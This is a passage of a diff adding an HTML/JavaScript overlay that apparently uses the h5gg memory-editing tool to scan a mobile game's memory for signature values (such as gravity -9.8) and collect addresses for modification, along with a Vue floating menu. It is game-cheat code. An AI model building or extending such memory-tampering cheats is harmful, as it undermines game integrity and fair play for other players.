+						zawsz[zawsl] = Number(sdsdf[i].address) + 4;
+						zawsl++;
+				}
+			}
+			h5gg.clearResults();
+			alert('完毕');
+		}
+		function zhuanqyss(){
+			zqjg = {};
+			qd = 0;
+			h5gg.clearResults();
+			h5gg.searchNumber('-9.8','F32', '0x100000000', '0x180000000');
+			var zqsl = h5gg.getResultsCount(); 
+			var zqjg = h5gg.getResults(zqsl); 
+			for(i = 0;i<zqsl;i++){
+				asrf = h5gg.getValue(Number(zqjg[i].address) + 56,'I32')
+				if(asrf == '1148846080' || asrf == '1106247680' || asrf == '1343554297'){
+					zqjg2[qd] = Number(zqjg[i].address) + 56;
+					qd++;
+					zqkgaa = true;
+				}
+			}
+			h5gg.clearResults();
+			alert('完毕'); 
+		}
+		
+		
+		
+		function mssj(){
+			mssz = [];
+			m4jg = 0;
+			h5gg.clearResults();
+			h5gg.searchNumber('880','F64', '0x100000000', '0x180000000');
+			h5gg.searchNearby('0.3', 'F64', '0x500');
+			h5gg.searchNearby('0.2', 'F64', '0x500');
+			h5gg.searchNumber('880', 'F64', '0x100000000', '0x180000000');
+			var zqsl = h5gg.getResultsCount(); 
+			var zqjg = h5gg.getResults(zqsl); 
+			for(i = 0;i<zqsl;i++){
+				mssz[m4jg] = zqjg[i].address;
+				m4jg++;
+			}
+		}
+		
+		function sszb(){
+		
+			ssszsl = 0;
+			shesudza = {};
+			h5gg.clearResults();
+			h5gg.searchNumber('1059004885','I32', '0x100000000', '0x180000000');
+			var zqsl = h5gg.getResultsCount(); 
+			var zqjg = h5gg.getResults(zqsl); 
+			ssszsl = 0;
+			shesudza = {};
+			for(i = 0;i<zqsl;i++){
+				if(h5gg.getValue(Number(zqjg[i].address) + 4,'I32') == 1008981770){
+					if(h5gg.getValue(Number(zqjg[i].address) + 12,'I64') == 0){
+						if(h5gg.getValue(Number(zqjg[i].address) + 20,'I64') == 4575657222473777152){
+							shesudza[ssszsl] = Number(zqjg[i].address) + 76;
+							ssszsl++;
+						}
+					}
+				}
+			}
+			alert('初始化完毕');
+		}
+		
+		
+
+		pdaad = false;
+		
+		function qubcz(duo,shao){
+			a33 = [];
+			a3szxb = 0;
+			for(i = 0;i < duo.length;i++){
+				pdaad = false;
+				for(j = 0;j < shao.length;j++){
+					if(duo[i] == shao[j]){
+						pdaad = true;
+						break;
+					}
+				}
+				if(pdaad){
+					
+				}else{
+					a33[a3szxb] = duo[i];
+					a3szxb++;
+				}
+			}
+			return a33;
+		}
+		
+		
+
+
+		
+
+		
+
+		
+	</script>
+
+	<script>
+		var app = new Vue({
+			el: "#app",
+			data() {
+				return {
+					ifshow: true,
+					checked: false,
+					radio: '1',
+					activeSelect: '',
+					selectOption: [{
+						value: '选项1',//实际内容
+						label: '黄金糕'//显示文案
+					}, {
+						value: '选项2',
+						label: '双皮奶'
+					}],
+					input: "",
+					showOption: false,
+					tabValue: "one",
+				}
+			},
+			mounted() {
+				this.setRect(360, 320);
+
+				//竖屏
+				var sWidth = window.screen.width; //屏幕宽
+				var sHeight = window.screen.height; //屏幕高
+
+				//全屏显示
+				if (window.screen.availWidth > window.screen.availHeight) {
+					//横屏，宽高置换
+					sWidth = window.screen.height; //屏幕宽
+					sHeight = window.screen.width; //屏幕高
+				}
+				setWindowRect(0, 0, sWidth, sHeight);
+
+				setButtonAction(function () {
+					var menu = document.querySelector("#app");
+					if (menu.style.display == 'none') {
+						menu.style.display = 'block';
+						//显示菜单之后, 设置触控不可穿透悬浮窗口
+						setWindowTouch(true);
+					} else {
+						menu.style.display = 'none';
+						//隐藏菜单之后, 设置触控穿透悬浮窗口
+						setWindowTouch(false);
+					}
+				});
+			},
+			methods: {
+				setRect(w, h, x = -1, y = -1) {
+					var boxW = w;
+					var boxH = h;
+
+					var ayMenu = this.$refs.menuMain;
+					ayMenu.style.width = `${boxW}px`;
+					ayMenu.style.height = `${boxH}px`;
+					if (x == -1) ayMenu.style.left = `calc(50% - ${boxW / 2}px)`;
+					if (y == -1) ayMenu.style.top = `calc(50% - ${boxH / 2}px)`;
+				},
+				titleTouchStart(event) {
+					this.touchStartX = parseInt(event.touches[0].clientX);
+					this.touchStartY = parseInt(event.touches[0].clientY);
+
+					var ayMenu = this.$refs.menuMain;
+					this.menuLastX = ayMenu.offsetLeft;
+					this.menuLastY = ayMenu.offsetTop;
+				},
+				titleTouchMove(event) {
+					event.preventDefault();
+					var distanceX = event.touches[0].clientX - this.touchStartX;
+					var distanceY = event.touches[0].clientY - this.touchStartY;
+
+					var ayMenu = this.$refs.menuMain;
+					ayMenu.style.left = this.menuLastX + distanceX + "px";
+					ayMenu.style.top = this.menuLastY + distanceY + "px";
+				},
+				//切换导航栏
+				changeTab(v) {
+					this.tabValue = v;
+				},
+				closeimgui() {
+					var menu = document.querySelector("#app");
+					menu.style.display = 'none';
+					setWindowTouch(false);
+				}
+			}
+		});
+
+	</script>
+</body>
+
+</html>
